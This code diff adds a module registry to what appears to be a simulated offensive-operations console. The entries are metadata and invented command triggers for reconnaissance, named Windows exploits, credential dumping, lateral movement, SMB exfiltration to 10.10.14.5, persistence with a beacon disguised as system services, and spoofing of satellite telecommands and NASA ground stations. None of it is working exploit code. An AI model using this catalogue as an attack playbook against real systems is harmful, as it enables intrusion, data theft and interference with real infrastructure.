@@ -76,44 +76,393 @@ export const APT_ATTACK_CHAINS: APTChain[] = [
 ];
 
 export const OFFENSIVE_REGISTRY: OffensiveModule[] = [
+  // ==================== RECON MODULES ====================
   {
-    id: 'orbital-ccsds-forge',
-    name: 'CCSDS Protocol Forge',
-    category: 'Orbital SIGINT',
-    description: 'Construct and inject space packets for TC/TM manipulation.',
-    opsecRisk: 'High',
-    noiseLevel: 9,
-    requiredIntegrity: 'User',
-    author: 'Spectre-Team',
-    commands: [
-      { trigger: 'ccsds-inject --apid 0x3E5', description: 'Inject Telecommand Space Packet' },
-      { trigger: 'ccsds-tm-spoof', description: 'Inject spoofed housekeeping telemetry' }
-    ]
-  },
-  {
-    id: 'orbital-relay-bounce',
-    name: 'Quantum Relay Bounce',
-    category: 'Orbital SIGINT',
-    description: 'Bounce C2 signals across LEO assets to hide ground station geolocation.',
+    id: 'enum-domain',
+    name: 'Domain Enumeration',
+    category: 'Recon',
+    description: 'Enumerate Active Directory domain information (users, admins, trusts, groups).',
     opsecRisk: 'Low',
     noiseLevel: 2,
     requiredIntegrity: 'User',
     author: 'Spectre-Team',
     commands: [
-      { trigger: 'relay-init --chain [43105,43569]', description: 'Initiate multi-hop orbital relay' }
+      { trigger: 'enum-domain --full', description: 'Full domain enumeration' },
+      { trigger: 'enum-domain --users', description: 'Enumerate domain users' },
+      { trigger: 'enum-domain --admins', description: 'List domain admins' },
+      { trigger: 'enum-domain --trusts', description: 'Enumerate domain trusts' }
     ]
   },
   {
-    id: 'orbital-gs-mimic',
-    name: 'GS Signature Mimicry',
-    category: 'Orbital SIGINT',
-    description: 'Simulates the RF footprint of authorized NASA or ESA ground stations.',
+    id: 'scan-network',
+    name: 'Network Discovery',
+    category: 'Recon',
+    description: 'Discover live hosts on target network subnet.',
+    opsecRisk: 'Medium',
+    noiseLevel: 6,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'scan-network --subnet 192.168.1.0/24', description: 'Scan network subnet' }
+    ]
+  },
+  {
+    id: 'scan-ports',
+    name: 'Port Scanner',
+    category: 'Recon',
+    description: 'Scan target host for open TCP/UDP ports.',
+    opsecRisk: 'Medium',
+    noiseLevel: 7,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'scan-ports --target 192.168.1.10', description: 'Scan target ports' }
+    ]
+  },
+  {
+    id: 'scan-services',
+    name: 'Service Enumeration',
+    category: 'Recon',
+    description: 'Identify services and versions running on target host.',
+    opsecRisk: 'Medium',
+    noiseLevel: 5,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'scan-services --target 192.168.1.10', description: 'Enumerate services' }
+    ]
+  },
+  {
+    id: 'bloodhound',
+    name: 'BloodHound Collection',
+    category: 'Recon',
+    description: 'Collect Active Directory data for graph analysis and attack path discovery.',
+    opsecRisk: 'High',
+    noiseLevel: 8,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'bloodhound --collect all', description: 'Collect all AD data' }
+    ]
+  },
+  {
+    id: 'enum-processes',
+    name: 'Process Enumeration',
+    category: 'Recon',
+    description: 'List running processes and associated security context.',
     opsecRisk: 'Low',
     noiseLevel: 1,
     requiredIntegrity: 'User',
     author: 'Spectre-Team',
     commands: [
-      { trigger: 'gs-mimic --profile NASA_CANBERRA', description: 'Enable Ground Station fingerprint mimicry' }
+      { trigger: 'enum-processes', description: 'List all processes' }
+    ]
+  },
+  {
+    id: 'enum-modules',
+    name: 'Module Enumeration',
+    category: 'Recon',
+    description: 'List loaded DLLs and modules for target process.',
+    opsecRisk: 'Low',
+    noiseLevel: 1,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'enum-modules --pid 1234', description: 'Enumerate process modules' }
+    ]
+  },
+  {
+    id: 'scan-orbital',
+    name: 'Orbital Asset Scanner',
+    category: 'Recon',
+    description: 'Scan for accessible satellite command interfaces and open RF channels.',
+    opsecRisk: 'Low',
+    noiseLevel: 3,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'scan-orbital --freq-range 137-138', description: 'Scan orbital frequencies' }
+    ]
+  },
+  
+  // ==================== EXPLOITATION MODULES ====================
+  {
+    id: 'exploit-eternalblue',
+    name: 'EternalBlue (MS17-010)',
+    category: 'Exploitation',
+    description: 'Exploit SMBv1 vulnerability for remote code execution.',
+    opsecRisk: 'High',
+    noiseLevel: 10,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'exploit-eternalblue --target 192.168.1.10', description: 'Execute EternalBlue exploit' }
+    ]
+  },
+  {
+    id: 'exploit-zerologon',
+    name: 'Zerologon (CVE-2020-1472)',
+    category: 'Exploitation',
+    description: 'Exploit Netlogon protocol to compromise domain controller.',
+    opsecRisk: 'High',
+    noiseLevel: 9,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'exploit-zerologon --dc DC01', description: 'Execute Zerologon exploit' }
+    ]
+  },
+  {
+    id: 'exploit-printnightmare',
+    name: 'PrintNightmare (CVE-2021-1675)',
+    category: 'Exploitation',
+    description: 'Exploit Windows Print Spooler for privilege escalation or RCE.',
+    opsecRisk: 'High',
+    noiseLevel: 8,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'exploit-printnightmare --target localhost', description: 'Execute PrintNightmare' }
+    ]
+  },
+  {
+    id: 'ccsds-inject',
+    name: 'CCSDS Packet Injection',
+    category: 'Exploitation',
+    description: 'Inject CCSDS space packets to manipulate satellite telecommand interfaces.',
+    opsecRisk: 'High',
+    noiseLevel: 9,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'ccsds-inject --apid 0x3E5', description: 'Inject telecommand packet' }
+    ]
+  },
+  {
+    id: 'ccsds-tm-spoof',
+    name: 'CCSDS Telemetry Spoof',
+    category: 'Exploitation',
+    description: 'Inject spoofed telemetry packets to mask satellite status.',
+    opsecRisk: 'High',
+    noiseLevel: 8,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'ccsds-tm-spoof --sat ISS', description: 'Spoof telemetry data' }
+    ]
+  },
+  {
+    id: 'kerberoast',
+    name: 'Kerberoasting',
+    category: 'Exploitation',
+    description: 'Extract and crack Kerberos TGS service tickets for domain accounts.',
+    opsecRisk: 'Medium',
+    noiseLevel: 5,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'kerberoast --domain CORP', description: 'Perform Kerberoasting attack' }
+    ]
+  },
+  
+  // ==================== POST-EXPLOITATION MODULES ====================
+  {
+    id: 'harvest-creds',
+    name: 'Credential Harvesting',
+    category: 'Post-Ex',
+    description: 'Extract credentials from LSASS memory, SAM registry, or DC sync.',
+    opsecRisk: 'High',
+    noiseLevel: 9,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'harvest-creds --lsass', description: 'Dump LSASS memory' },
+      { trigger: 'harvest-creds --sam', description: 'Dump SAM hashes' },
+      { trigger: 'harvest-creds --dcsync', description: 'DC Sync attack' }
+    ]
+  },
+  {
+    id: 'lateral-psexec',
+    name: 'Lateral Movement (PsExec)',
+    category: 'Post-Ex',
+    description: 'Execute commands on remote system using PsExec technique.',
+    opsecRisk: 'High',
+    noiseLevel: 8,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'lateral-psexec --target DC01 --command whoami', description: 'PsExec lateral movement' }
+    ]
+  },
+  {
+    id: 'lateral-wmi',
+    name: 'Lateral Movement (WMI)',
+    category: 'Post-Ex',
+    description: 'Execute commands on remote system using WMI.',
+    opsecRisk: 'Medium',
+    noiseLevel: 6,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'lateral-wmi --target DC01 --command hostname', description: 'WMI lateral movement' }
+    ]
+  },
+  {
+    id: 'steal-token',
+    name: 'Token Theft',
+    category: 'Post-Ex',
+    description: 'Steal access token from target process for impersonation.',
+    opsecRisk: 'Medium',
+    noiseLevel: 4,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'steal-token --pid 1234', description: 'Steal process token' }
+    ]
+  },
+  {
+    id: 'revert-token',
+    name: 'Token Reversion',
+    category: 'Post-Ex',
+    description: 'Revert to original process token.',
+    opsecRisk: 'Low',
+    noiseLevel: 1,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'revert-token', description: 'Revert to original token' }
+    ]
+  },
+  {
+    id: 'exfil-smb',
+    name: 'SMB Data Exfiltration',
+    category: 'Post-Ex',
+    description: 'Exfiltrate files/data over SMB to remote server.',
+    opsecRisk: 'High',
+    noiseLevel: 7,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'exfil-smb --path C:\\Users --target 10.10.14.5', description: 'Exfiltrate via SMB' }
+    ]
+  },
+  {
+    id: 'relay-init',
+    name: 'Orbital Relay Initialization',
+    category: 'Post-Ex',
+    description: 'Initialize multi-hop orbital relay chain to obfuscate C2 traffic.',
+    opsecRisk: 'Low',
+    noiseLevel: 2,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'relay-init --chain [43105,43569]', description: 'Init orbital relay' }
+    ]
+  },
+  {
+    id: 'relay-status',
+    name: 'Relay Status Check',
+    category: 'Post-Ex',
+    description: 'Check current status of orbital relay chain.',
+    opsecRisk: 'Low',
+    noiseLevel: 1,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'relay-status', description: 'Check relay status' }
+    ]
+  },
+  
+  // ==================== PERSISTENCE MODULES ====================
+  {
+    id: 'persist-schtask',
+    name: 'Scheduled Task Persistence',
+    category: 'Persistence',
+    description: 'Create scheduled task for persistent access.',
+    opsecRisk: 'Medium',
+    noiseLevel: 5,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'persist-schtask --name WindowsUpdate --exe C:\\beacon.exe', description: 'Create scheduled task' }
+    ]
+  },
+  {
+    id: 'persist-registry',
+    name: 'Registry Run Key Persistence',
+    category: 'Persistence',
+    description: 'Add registry Run key for auto-start persistence.',
+    opsecRisk: 'Medium',
+    noiseLevel: 4,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'persist-registry --name SecurityHealth --exe C:\\beacon.exe', description: 'Add registry key' }
+    ]
+  },
+  {
+    id: 'persist-service',
+    name: 'Windows Service Persistence',
+    category: 'Persistence',
+    description: 'Install Windows service for persistent access.',
+    opsecRisk: 'High',
+    noiseLevel: 7,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'persist-service --name SecurityHealthService --exe C:\\beacon.exe', description: 'Install service' }
+    ]
+  },
+  {
+    id: 'persist-wmi',
+    name: 'WMI Event Subscription',
+    category: 'Persistence',
+    description: 'Create WMI event subscription for fileless persistence.',
+    opsecRisk: 'Low',
+    noiseLevel: 3,
+    requiredIntegrity: 'Administrator',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'persist-wmi --trigger logon --payload base64payload', description: 'Create WMI subscription' }
+    ]
+  },
+  {
+    id: 'golden-ticket',
+    name: 'Golden Ticket Persistence',
+    category: 'Persistence',
+    description: 'Generate Kerberos Golden Ticket for domain-wide persistence.',
+    opsecRisk: 'High',
+    noiseLevel: 8,
+    requiredIntegrity: 'SYSTEM',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'golden-ticket --user Administrator --domain CORP.LOCAL', description: 'Generate Golden Ticket' }
+    ]
+  },
+  {
+    id: 'persist-aos',
+    name: 'Satellite AOS Persistence',
+    category: 'Persistence',
+    description: 'Maintain persistence via satellite Acquisition of Signal (AOS) triggers.',
+    opsecRisk: 'Low',
+    noiseLevel: 2,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'persist-aos --sat ISS --callback http://10.10.14.5', description: 'Configure AOS trigger' }
+    ]
+  },
+  {
+    id: 'gs-mimic',
+    name: 'Ground Station Mimicry',
+    category: 'Persistence',
+    description: 'Mimic authorized ground station RF signature for persistent satellite access.',
+    opsecRisk: 'Low',
+    noiseLevel: 1,
+    requiredIntegrity: 'User',
+    author: 'Spectre-Team',
+    commands: [
+      { trigger: 'gs-mimic --profile NASA_CANBERRA', description: 'Enable GS mimicry' }
     ]
   }
 ];
